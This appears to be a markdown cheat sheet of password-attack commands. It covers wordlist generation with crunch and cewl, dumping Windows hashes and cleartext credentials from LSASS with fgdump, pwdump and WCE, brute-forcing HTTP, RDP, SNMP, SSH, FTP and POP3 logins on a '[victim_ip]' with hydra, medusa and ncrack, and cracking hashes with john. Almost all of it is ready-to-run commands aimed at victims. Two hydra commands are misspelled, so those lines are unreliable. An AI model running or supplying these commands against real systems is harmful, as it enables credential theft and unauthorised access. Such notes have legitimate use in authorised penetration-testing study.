- [Password_generator](#Password_generator)
  - [Crunch](#Crunch)
 -[Windows](#Windows)
  - [pwdump](#pwdump)
  - [WCE](#WCE)
 -[Password_cracking](#Cracking)
  - [HTTP](#HTTP)
  - [RDP](#RDP)
  - [SNMP](#SNMP)
  - [SSH](#SSH)
  - [FTP](#FTP)
  - [POP3](#POP3)
 -[Password Hash](#Hash)
  - [MD5](#MD5)
 
## Password generator
### Crunch: 
  - is a wordlist generator where you can specify a standard character set or a character set you specify.

##### crunch 6 6 1234567890ABCDE -o <file.txt>
  - ***6*** min length
  - ***6*** max length
  - ***1234567890ABCDE*** charset
  - ***o*** seve result in file
 
##### crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha
  - ***f*** dictionary path
  
##### special chars
  - @ lower case alpha char
  - , upper case alpha char
  - % numeric charset
  - ^ special char include space
------------------------------------------------------------------------------------------------------------------------
### Windows  

#### pwdump fgdump
MS Windows store hased user password in the ***Security account manager (SAM)***
pwdump and fgdump inject a DLL containning the hash dumping code into the ***Local Security Authority Subsystem (LSASS)***

***- c:\> fgdump.exe ***
***- c:\> type 127.0.0.1.pwdump ***

### WCE
- WCE can steal NTLM credentails from memory and dump clear text password
***- c:\> WCE -w ***
------------------------------------------------------------------------------------------------------------------------

### Password Profiling

#### cewl
- cewl <victim_www_url> -d [num] -m [num] -w [file.txt]
------------------------------------------------------------------------------------------------------------------------  
  
### Cracking

#### HTTP
- medusa -h [url] -u [user_name] -p [password_file.txt] -M http

#### RDP B
- ncrack -vv --user [user_name] -P [password_file.txt] rdp://[victim_ip]

#### SNMP 
- hydra -P [password-file.txt] -v [victim_ip] snmp

#### SSH 
- hydra -l [user_name] -P [password_file.txt] [victim_ip] ssh

#### FTP 
- hyrda -L [user_file] -p [password] [victim_ip] ftp

#### POP3 
- hyrda -L [user_file] -P [password_file.txt] [victim_ip] -s [victim_port] -t 50 -I pop3

##### Usefull flag
- -vV : verbose mode
- -e nsr : login as password or login as password in reversed order etc
- -t : threads
------------------------------------------------------------------------------------------------------------------------

### Hash 

#### Hash identifier
 - usage: hash-identifier
 
#### MD5
- john --format=raw-md5 --wordlist=rockyou.txt [hash.file]

#### SHA1
- john --format=raw-sha1 --wordlist=rockyou.txt [hash.file]

#### SHA224
- john --format=raw-sha224 --wordlist=rockyou.txt [hash.file]

#### SHA512
- john --format=raw-sha512 --wordlist=rockyou.txt [hash.file]
------------------------------------------------------------------------------------------------------------------------

### Pass the hash

# //TODO!
